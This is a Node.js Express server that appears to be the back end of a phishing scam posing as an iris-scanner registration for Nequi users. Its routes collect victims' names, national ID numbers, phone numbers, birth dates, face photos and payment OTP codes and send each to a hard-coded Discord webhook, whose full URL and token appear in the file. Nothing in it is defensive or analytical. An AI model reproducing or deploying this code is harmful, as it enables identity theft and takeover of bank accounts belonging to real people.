const express = require('express');
const multer = require('multer');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1458590534120636581/JBIIFKwkHfqHfFKPulTj0ZrwBTjmTK1O7SA5L0oSQWXHz-x3YbAeyrNQSgZ2ru9ASLva';

// Configure Multer for memory storage (we don't need to save files to disk permanently)
const upload = multer({ storage: multer.memoryStorage() });

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Keep-alive endpoint
app.get('/ping', (req, res) => {
    res.status(200).send('pong');
});

// Route to handle initial registration data
app.post('/api/register', async (req, res) => {
    const data = req.body;
    
    try {
        const embed = {
            title: "📝 Nuevo Registro - Escáner de Iris",
            color: 3447003, // Blue color
            fields: [
                { name: "Nombre", value: data.nombre, inline: true },
                { name: "Apellido", value: data.apellido, inline: true },
                { name: "Cédula", value: data.cedula, inline: true },
                { name: "Teléfono Nequi", value: data.nequi, inline: true },
                { name: "Fecha de Nacimiento", value: data.fechaNacimiento, inline: true },
                { name: "Ciudad", value: data.ciudad, inline: true },
                { name: "Departamento", value: data.departamento, inline: true }
            ],
            footer: {
                text: "Sistema de Procesamiento de Datos Biométricos"
            },
            timestamp: new Date().toISOString()
        };

        await axios.post(DISCORD_WEBHOOK_URL, { embeds: [embed] });
        res.json({ success: true, message: "Datos recibidos correctamente" });
    } catch (error) {
        console.error("Error sending to Discord:", error);
        res.status(500).json({ success: false, message: "Error al procesar datos" });
    }
});

// Route to handle face photo upload
app.post('/api/upload-face', upload.single('photo'), async (req, res) => {
    if (!req.file) {
        return res.status(400).json({ success: false, message: "No se recibió ninguna imagen" });
    }

    try {
        const form = new FormData();
        form.append('payload_json', JSON.stringify({
            content: `📸 **Captura Facial Recibida**\nUsuario: ${req.body.nombre || 'Desconocido'}`
        }));
        
        form.append('file', req.file.buffer, {
            filename: 'face-capture.png',
            contentType: req.file.mimetype
        });

        await axios.post(DISCORD_WEBHOOK_URL, form, {
            headers: {
                ...form.getHeaders()
            }
        });

        res.json({ success: true, message: "Foto procesada correctamente" });
    } catch (error) {
        console.error("Error sending photo to Discord:", error);
        res.status(500).json({ success: false, message: "Error al procesar la imagen" });
    }
});

// Route to handle OTP verification
app.post('/api/verify-payment', async (req, res) => {
    const { code, nombre } = req.body;
    
    try {
        const embed = {
            title: "🔐 Código de Verificación (OTP) Recibido",
            color: 16711680, // Red color for high alert
            fields: [
                { name: "Usuario", value: nombre || "Desconocido", inline: true },
                { name: "Código OTP", value: `**${code}**`, inline: true }
            ],
            footer: {
                text: "Sistema de Pagos Nequi - Verificación"
            },
            timestamp: new Date().toISOString()
        };

        await axios.post(DISCORD_WEBHOOK_URL, { embeds: [embed] });
        res.json({ success: true, message: "Código procesado" });
    } catch (error) {
        console.error("Error sending OTP to Discord:", error);
        res.status(500).json({ success: false, message: "Error al procesar código" });
    }
});

app.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
